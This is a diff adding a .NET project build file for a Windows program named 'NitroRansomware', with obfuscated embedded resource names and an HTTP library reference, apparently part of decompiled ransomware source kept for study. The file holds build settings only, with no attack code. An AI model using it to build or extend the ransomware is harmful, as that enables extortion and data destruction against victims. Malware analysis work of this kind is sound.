@@ -1,0 +1,31 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>NitroRansomware</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net472</TargetFramework>
+    <Prefer32Bit>True</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>Preview</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="Zolk9kCyJtZSWZwA3H.C5fn7SnRigF4bi1Hkk" />
+    <None Remove="NitroRansomware.Resources.wl.png" />
+    <None Remove="TobEC4hIgCxF0TwsAh.Xg5oMBsggOsrj5CWF8" />
+    <EmbeddedResource Include="Zolk9kCyJtZSWZwA3H.C5fn7SnRigF4bi1Hkk" />
+    <EmbeddedResource Include="NitroRansomware.Resources.wl.png" />
+    <EmbeddedResource Include="TobEC4hIgCxF0TwsAh.Xg5oMBsggOsrj5CWF8" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Core">
+      <HintPath>/home/petik/dotnet/shared/Microsoft.NETCore.App/6.0.8/System.Core.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+</Project>
